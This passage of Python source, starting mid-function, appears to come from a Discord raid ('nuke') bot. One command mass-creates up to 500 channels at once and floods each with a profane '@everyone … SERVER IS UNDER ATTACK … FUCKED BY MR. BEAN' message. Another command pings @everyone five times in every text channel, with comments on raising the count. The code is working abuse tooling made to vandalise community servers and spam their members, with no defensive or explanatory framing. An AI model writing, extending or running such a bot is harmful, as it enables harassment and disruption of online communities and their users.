                               base_name="Mr Bean is here"):
    """
    Mass create channels command - creates multiple channels instantly and sends @everyone message
    Usage: !masscreate or !masscreate 100 or !masscreate 25 channel-name
    """
    try:
        # Check if user has manage channels permission
        if not ctx.author.guild_permissions.manage_channels:
            await ctx.send("❌ You don't have permission to manage channels!")
            return

        # Check if bot has manage channels permission
        if not ctx.guild.me.guild_permissions.manage_channels:
            await ctx.send("❌ I don't have permission to manage channels!")
            return

        # Validate count
        if count <= 0:
            await ctx.send("❌ Channel count must be greater than 0!")
            return

        if count > 500:  # Discord limit protection
            await ctx.send("❌ Maximum 500 channels can be created at once!")
            return

        guild = ctx.guild

        await ctx.send(
            f"🚀 Mass creating {count} channels with base name '{base_name}'..."
        )

        # Create channels in parallel for maximum speed
        tasks = []
        for i in range(1, count + 1):
            channel_name = f"{base_name}-{i}"
            tasks.append(
                guild.create_text_channel(
                    name=channel_name,
                    reason=f"Mass channel creation by {ctx.author}"))

        # Execute all tasks in parallel
        results = await asyncio.gather(*tasks, return_exceptions=True)

        created_channels = []
        failed_count = 0

        for i, result in enumerate(results):
            if isinstance(result, Exception):
                failed_count += 1
                logger.error(
                    f"Failed to create channel {base_name}-{i+1}: {result}")
            else:
                created_channels.append(result)

        created_count = len(created_channels)

        result_msg = f"✅ Mass channel creation completed!\n"
        result_msg += f"• Successfully created: {created_count} channels\n"
        if failed_count > 0:
            result_msg += f"• Failed to create: {failed_count} channels\n"

        await ctx.send(result_msg)

        # Now send @everyone message to all created channels
        if created_channels:
            await ctx.send(
                f"📢 Sending @everyone messages to {len(created_channels)} channels..."
            )

            message_content = f" #  @everyone THIS SERVER FUCK BY MR BEAN  \n  🔥 **SERVER CHANNEL CREATED BY {ctx.author.mention}** 🔥\n💀 SERVER IS UNDER ATTACK! 💀\n 🚀 SERVER FUCKED BY MR. BEAN ! 🚀"

            # Send messages in parallel chunks to avoid rate limits
            chunk_size = 25  # Smaller chunks for messages to avoid rate limits
            message_tasks = []

            for i in range(0, len(created_channels), chunk_size):
                chunk = created_channels[i:i + chunk_size]

                for channel in chunk:
                    task = asyncio.create_task(
                        send_everyone_message(channel, message_content))
                    message_tasks.append(task)

                # Execute chunk
                chunk_results = await asyncio.gather(
                    *message_tasks[-len(chunk):], return_exceptions=True)

                sent_count = sum(1 for r in chunk_results
                                 if not isinstance(r, Exception))
                failed_msg_count = len(chunk) - sent_count

                await ctx.send(
                    f"📨 Sent messages to {sent_count} channels | Failed: {failed_msg_count}"
                )

                # Small delay between chunks to avoid rate limits
                if i + chunk_size < len(created_channels):
                    await asyncio.sleep(1)

            total_sent = sum(1 for task in message_tasks if not isinstance(
                task.result() if task.done() else None, Exception))
            await ctx.send(
                f"🎯 **MASS MENTION COMPLETED!** @everyone messages sent to {total_sent} channels!"
            )

        logger.info(
            f"Mass created {created_count} channels with @everyone messages by {ctx.author}"
        )

    except Exception as e:
        logger.error(f"Error in mass_create_channels command: {e}")
        await ctx.send(f"❌ An error occurred: {str(e)}")


async def send_everyone_message(channel, message_content):
    """Helper function to send @everyone message to a channel"""
    try:
        await channel.send(message_content)
        logger.info(f"Sent @everyone message to {channel.name}")
        return True
    except Exception as e:
        logger.error(f"Failed to send message to {channel.name}: {e}")
        return False


@bot.command(name='spameveryone')
async def spam_everyone_all_channels(ctx, *, message="🔥 EVERYONE ATTACK! 🔥"):
    """
    Send 5 @everyone messages to all channels in the server
    Usage: !spameveryone or !spameveryone custom message here
    """
    try:
        # Check if user has mention everyone permission
        if not ctx.author.guild_permissions.mention_everyone:
            await ctx.send("❌ You don't have permission to mention everyone!")
            return

        # Check if bot has send messages permission
        if not ctx.guild.me.guild_permissions.send_messages:
            await ctx.send("❌ I don't have permission to send messages!")
            return

        guild = ctx.guild
        text_channels = [
            ch for ch in guild.channels if isinstance(ch, discord.TextChannel)
        ]

        if not text_channels:
            await ctx.send("ℹ️ No text channels found!")
            return

        # Number of mentions per channel (আপনি এই লাইন চেঞ্জ করতে পারবেন)
        mentions_per_channel = 5  # লাইন 823: এইটা চেঞ্জ করলে প্রতি চ্যানেলে কতবার মেনশন যাবে সেটা চেঞ্জ হবে

        await ctx.send(
            f"📢 Sending {mentions_per_channel} @everyone messages to {len(text_channels)} channels..."
        )

        # Prepare the message with @everyone
        spam_message = f"@everyone\n{message}\n💀 **INITIATED BY {ctx.author.mention}** 💀"

        # Send messages in parallel chunks
        chunk_size = 20
        total_sent = 0
        total_failed = 0

        for i in range(0, len(text_channels), chunk_size):
            chunk = text_channels[i:i + chunk_size]

            # Create tasks for this chunk - send 5 messages per channel
            tasks = []
            for channel in chunk:
                # Send 5 messages to each channel
                for _ in range(mentions_per_channel):
                    task = asyncio.create_task(
                        send_everyone_message(channel, spam_message))
                    tasks.append(task)

            # Execute chunk
            results = await asyncio.gather(*tasks, return_exceptions=True)

            # Count results
            chunk_sent = sum(1 for r in results
                             if not isinstance(r, Exception))
            chunk_failed = len(results) - chunk_sent

            total_sent += chunk_sent
            total_failed += chunk_failed

            # Progress update
            processed = min(i + chunk_size, len(text_channels))
            await ctx.send(
                f"📨 Progress: {processed}/{len(text_channels)} channels | Total sent: {total_sent} | Failed: {total_failed}"
            )

            # Small delay between chunks
            if i + chunk_size < len(text_channels):
                await asyncio.sleep(0.5)

        # Final results
        await ctx.send(f"🎯 **@EVERYONE SPAM COMPLETED!**")
        await ctx.send(
            f"✅ Successfully sent {total_sent} messages across all channels"
        )
        if total_failed > 0:
            await ctx.send(f"❌ Failed to send {total_failed} messages")

        logger.info(
            f"@everyone spam completed by {ctx.author}: {total_sent} sent, {total_failed} failed"
        )

    except Exception as e:
        logger.error(f"Error in spam_everyone_all_channels command: {e}")
        await ctx.send(f"❌ An error occurred: {str(e)}")


@bot.event
async def on_command_error(ctx, error):
    """Global error handler for commands"""
    if isinstance(error, commands.CommandNotFound):
        return  # Ignore command not found errors
    elif isinstance(error, commands.MissingPermissions):
        await ctx.send(
            "❌ You don't have the required permissions to use this command!")
    elif isinstance(error, commands.BotMissingPermissions):
        await ctx.send(
            "❌ I don't have the required permissions to execute this command!")
    else:
        logger.error(f"Unhandled command error: {error}")
        await ctx.send(f"❌ An unexpected error occurred: {str(error)}")


def main():
    """Main function to start the bot"""
    # Get bot token from environment variable
    token = os.getenv('TOKEN')

    if not token:
        logger.error("No TOKEN environment variable found!")
        print("❌ Error: TOKEN environment variable is required!")
        print(
            "Please set the TOKEN environment variable with your Discord bot token."
        )
        return

    try:
        # Start the bot
        bot.run(token)
    except discord.LoginFailure:
        logger.error("Invalid bot token provided")
        print(
            "❌ Error: Invalid bot token! Please check your TOKEN environment variable."
        )
    except Exception as e:
        logger.error(f"Failed to start bot: {e}")
        print(f"❌ Error starting bot: {e}")


if __name__ == "__main__":
    main()
